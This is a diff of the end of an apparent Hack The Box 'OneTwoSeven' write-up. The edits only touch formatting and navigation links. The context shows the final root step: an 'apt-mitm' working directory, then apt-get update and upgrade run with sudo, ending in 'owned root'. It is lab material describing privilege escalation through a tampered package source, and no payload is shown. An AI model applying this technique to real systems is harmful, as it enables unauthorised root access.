@@ -839,17 +819,18 @@ root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binar
 www-admin-data@onetwoseven:/$ sudo apt-get update
 </code></pre></div></div>
 <p><br> Then I ran <code class="highlighter-rouge">apt-get upgrade</code> :
-<img src="/images/hackthebox/onetwoseven/33.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/33.png" alt=""><br>
 <br>
 <br>
-<img src="/images/hackthebox/onetwoseven/34.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/34.png" alt=""><br>
 <br> And we owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
 <br> Thanks for reading.
 <br>
 <br>
-<br> Previous Hack The Box write-up : <a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></p>
+<br> Previous Hack The Box write-up : <a href="/hack-the-box/unattended/">Hack The Box - Unattended</a>
+<br> Next Hack The Box write-up : <a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></p>
 <hr>
 
 
